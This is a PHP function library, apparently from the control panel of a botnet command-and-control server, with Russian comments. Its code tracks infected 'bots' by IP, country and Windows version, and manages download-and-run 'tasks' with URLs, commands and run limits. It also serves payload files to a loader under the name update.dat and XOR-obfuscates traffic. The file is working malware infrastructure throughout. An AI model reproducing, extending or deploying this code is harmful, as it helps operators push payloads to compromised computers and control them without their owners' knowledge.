<?php

/**
* Функция шифрования
*/
function encrypt($string, $key)
{
	$o = "";
	$j = 0;

	for($i = 0; $i < strlen($string); $i++)
	{
		$o .= chr(ord($string{$i}) ^ ord($key{$j++}));
		if($j >= strlen($key)) $j = 0;
	}

	return $o;
}

/**
* Функция генерации ключа
*/
function generate_key($len)
{
	$o = "";

	for($i = 0; $i < $len; $i++)
	{
		$o .= chr(rand() % 255);
	}

	return $o;
}

/**
* Функция определения операционной системы по major и minor версии
*/
function get_os($version)
{
	if(strstr($version, "5-1")) $id = 1; // Windows XP
	else if(strstr($version, "5-2")) $id = 2; // Windows 2003
	else if(strstr($version, "6-0")) $id = 3; // Windows Vista
	else if(strstr($version, "6-1")) $id = 4; // Windows 7
	else $id = 5;
	return $id;
}

/**
* Функция записи данных в файл
*/
function save_to_file($file, $data)
{
	$handle = fopen($file, "a");
	flock($handle, LOCK_EX);
	fwrite($handle, $data);
	flock($handle, LOCK_UN);
	fclose($handle);
}

/**
* Функция передачи файла лоадеру
*/
function download_file($filepath)
{
	if(file_exists($filepath))
	{
		header("Cache-Control: public");
		header("Content-Disposition: attachment; filename=update.dat");
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: binary");
		header("Content-Length: " . filesize($filepath));
		readfile($filepath);
	}
}

/**
* Функция определения страны бота
*/
function get_country($ip)
{
	$gi = geoip_open("includes/geoip.dat", GEOIP_STANDARD);
	$id = geoip_country_code_by_addr($gi, $ip);		
	if(empty($id)) $id = "xx";
	geoip_close($gi);
	return $id;
}

/**
* Функция определения валидность IP
*/
function validip($ip) {
	if (!empty($ip) && ip2long($ip)!=-1) {
		$reserved_ips = array (
			array('0.0.0.0','2.255.255.255'),
			array('10.0.0.0','10.255.255.255'),
			array('127.0.0.0','127.255.255.255'),
			array('169.254.0.0','169.254.255.255'),
			array('172.16.0.0','172.31.255.255'),
			array('192.0.2.0','192.0.2.255'),
			array('192.168.0.0','192.168.255.255'),
			array('255.255.255.0','255.255.255.255')
		);

		foreach ($reserved_ips as $r) {
			$min = ip2long($r[0]);
			$max = ip2long($r[1]);
			if ((ip2long($ip) >= $min) && (ip2long($ip) <= $max)) return false;
		}
 
		return true;

	} else {
		return false;
	}
} 


/**
* Функция определения IP
*/
function getip() {
	if (validip(@$_SERVER["HTTP_CLIENT_IP"])) {
		return $_SERVER["HTTP_CLIENT_IP"];
	}

	foreach (explode(",",@$_SERVER["HTTP_X_FORWARDED_FOR"]) as $ip) {
		if (validip(trim($ip))) { return $ip; }
	}

	if (validip(@$_SERVER["HTTP_X_FORWARDED"])) {
		return $_SERVER["HTTP_X_FORWARDED"];
	} elseif (validip(@$_SERVER["HTTP_FORWARDED_FOR"])) {
		return $_SERVER["HTTP_FORWARDED_FOR"];
	} elseif (validip(@$_SERVER["HTTP_FORWARDED"])) {
		return $_SERVER["HTTP_FORWARDED"];
	} elseif (validip(@$_SERVER["HTTP_X_FORWARDED"])) {
		return $_SERVER["HTTP_X_FORWARDED"];
	} else {
		return $_SERVER["REMOTE_ADDR"];
	}
} 

/**
* Функция сбора общей информации
*/
function get_total() {
	global $db;
	$v=$db->query("SELECT *, count(*) as count FROM bots GROUP BY id");
	return $v[0]==0 ? 0 : count($v);
}

function get_online() {
	global $db,$config;
	$v=$db->query("SELECT COUNT(*) as cnt FROM bots WHERE `last_time` >= '".intval(time()-$config['ttl']*60)."' GROUP BY id");
	return $v[0]==0 ? 0 : count($v);
}

function get_offline() {
	return get_total()-get_online();
}

function get_tasks() {
	global $db;
	$v=$db->query("SELECT COUNT(*) as taskCount FROM `tasks` WHERE tasks.stop != '-1'");
	return $v[0]==0 ? 0 : $v[0]['taskCount'];
}

function get_loaded() {	
	global $db;
	$v=$db->query("SELECT COUNT(*) as value FROM `finished` WHERE `taskId` != '1'");
	return $v[0]==0 ? 0 : $v[0]['value'];
}

function get_chart_data() {
	global $db;
	global $lang,$l;
	$i=0;
	$v=$db->query("SELECT cc, COUNT(*) as cnt FROM bots GROUP BY ip ORDER BY cnt DESC;");
	if ($v[0]==0) return "<h3 style='margin:15px;font-weight:normal;'>".$lang[$l][10]."</h3>";
	foreach ($v as $k=>$r) {
		if ($i>6) break;
		$cc[]=$r['cc'];
		$cn[]=$r['cnt'];
		$i++;
	}
	$cc=implode(",",$cc);
	$cn=implode(",",$cn);
	return '<img src="./chart.php?cc='.$cc.'&cn='.$cn.'">';
}

function get_top_5() {
	global $db;
	global $lang,$l;
	include('./includes/data.php');
	$v=$db->query("SELECT * FROM `bots` GROUP BY `ip`,`system` ORDER BY `last_time` DESC  LIMIT 5");
	if ($v[0]==0) return "<tr><td colspan=5 align=center><h3 style='margin:15px;font-weight:normal;'>".$lang[$l][10]."</h3></td></tr>";
	$out='';
	foreach($v as $k=>$r)
	{
		$out.='<tr><td>'.$r['ip'].'</td><td>'.$r['id'].'</td><td><img src="'.str_replace("/pages","",WEB_ROOT).'/images/country/' . strtolower($r['cc']) . '.gif">&nbsp;&nbsp;'.$r['cc'].'</td><td><img src="'.str_replace("/pages","",WEB_ROOT).'/images/systems/'.$r['system'].'.png">&nbsp;&nbsp;'.$systems[$r['system']].'</td><td>'.date("d.m.Y H:i.s",$r['last_time']).'</td></tr>'."\r\n";
	}
	return $out;
}

function get_top_os() {
	global $db;
	global $lang,$l;
	include('./includes/data.php');
	$v=$db->query("SELECT system,COUNT(*) as cnt FROM bots GROUP BY system ORDER BY cnt DESC;");
	if ($v[0]==0) return "<tr><td colspan=3 align=center><h3 style='margin:15px;font-weight:normal;'>".$lang[$l][10]."</h3></td></tr>";
	$out='';
	foreach($v as $k=>$r){
		$out.='<tr><td><img src="'.str_replace("/pages","",WEB_ROOT).'/images/systems/'.$r['system'].'.png">&nbsp;&nbsp;'.$systems[$r['system']].'</td><td>'.$r['cnt'].'</td></tr>'."\r\n";
	
	}
	return $out;
}


function get_cc_stat() {
	global $db;
	global $lang,$l;
	$v=$db->query("SELECT cc, COUNT(*) as cnt FROM bots GROUP BY cc ORDER BY cnt DESC;");
	if ($v[0]==0) return "<tr><td colspan=2 align=center><h3 style='margin:15px;font-weight:normal;'>".$lang[$l][10]."</h3></td></tr>";
	$out='';
	foreach($v as $k=>$r){
		$out.='<tr><td><img src="'.str_replace("/pages","",WEB_ROOT).'/images/country/'.strtolower($r['cc']).'.gif">&nbsp;&nbsp;'.$r['cc'].'</td><td>'.$r['cnt'].'</td></tr>'."\r\n";
	}
	return $out;
}


/**
* Функции для задачь
*/

function select_cc() {
	if (!function_exists('geoip_country_name_by_name')) include('./includes/geoip.php');
	$gip = new GeoIP;
	echo '<label><input type=checkbox value="0" id="cc_0" onClick="dizCB();">ALL</label><br>';
	foreach($gip->GEOIP_COUNTRY_NAMES as $k => $v) {
		if ($v!='') {
			echo '<label><input type="checkbox" value="'.$k.'" id="cc_'.$k.'">'.$v.'</label><br>';
		}
	}
	echo '<input id="cccount" value="'.intval(count($gip->GEOIP_COUNTRY_NAMES)-1).'" type="hidden">';
}

function show_tasks() {
	global $db;
	global $lang,$l;
	$r=$db->query("SELECT * FROM `tasks` WHERE tasks.stop != '-1' ORDER BY tasks.id");
	if ($r[0]==0) { return ''; }
	$out='';
	foreach($r as $k=>$v){
		$out .= '<tr>';
		$out .= '<td><img align="top" style="margin-top:0px;margin-right:5px;margin-left:5px;" src="images/task.png">'.$v['id'].'</td>';
		$out .= '<td id="url'.$v['id'].'">'.$v['url'].'</td>';
		$out .= '<td>';
		$out .= $v['command']=='' ? "" : $v['command'];
		$out .= '</td>';
		$out .= '<td>';
		$out .= $v['flags']=='' ? "" : $v['flags'];
		$out .= '</td>';
		$out .= '<td>';
		$out .= $v['functionName']=='' ? "&nbsp;" : $v['functionName'];
		$out .= '</td>';
		$out .= '<td>';
		$out .= $v['limit']==0 ? "unlimited" : $v['limit'];
		$out .= '</td>';
		$out .= '<td>';
		$out .= $v['count'];
		$out .= '</td>';
		$out .= '<td><span class="delBtn" onClick="doDel('.$v['id'].',this);">'.$lang[$l][6].'</span> | <span class="delBtn" onClick="doEdit('.$v['id'].',this);">'.$lang[$l][7].'</span> | ';
		if ($v['stop']==0) $out .= '<span class="delBtn stopBtn" onClick="doStopTask('.$v['id'].',this);">'.$lang[$l][8].'</span></td>';
		if ($v['stop']==1) $out .= '<span class="delBtn stopBtn" onClick="doStopTask('.$v['id'].',this);">'.$lang[$l][9].'</span></td>';
		
		$out .= "</tr>";
	}
	return $out;
}


function getRemoteLen($url) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, FALSE);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	$result  = curl_exec($ch);
	if(curl_errno($ch)) { return ''; }
	$headers = curl_getinfo($ch);
	curl_close ($ch);
	unset($ch);
	return $headers['download_content_length'] ? $headers['size_download'] : 0;
}

?>